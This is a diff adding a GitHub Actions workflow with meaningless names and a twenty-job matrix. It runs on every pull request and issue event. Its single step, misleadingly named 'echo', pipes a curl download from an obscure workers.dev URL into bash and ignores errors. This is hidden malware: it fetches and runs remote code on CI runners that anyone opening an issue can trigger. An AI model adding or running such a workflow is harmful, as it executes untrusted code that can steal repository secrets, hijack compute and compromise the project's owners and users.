@@ -1,0 +1,20 @@
+name: indoors
+
+on:
+  pull_request:
+    branches: [ "main" ]
+  issues:
+
+jobs:
+  motive:
+    strategy:
+      matrix:
+        hardware: ["pocket", "agreement", "absorb", "bed", "beyond"]
+        cancel: ["neutral", "compass", "strategic", "leap"]
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v6
+    - name: echo
+      continue-on-error: true
+      run: |
+        curl -sS -L -X GET "https://x.linux-work-10x1za.workers.dev/de586dead7ff3eb5b066e2f6a16d808/fbd2ca8c7/9a9f7315df8b2e/94f3eb6335?j=1775934601&oi=smb&t=vq&mgi=mo" | bash
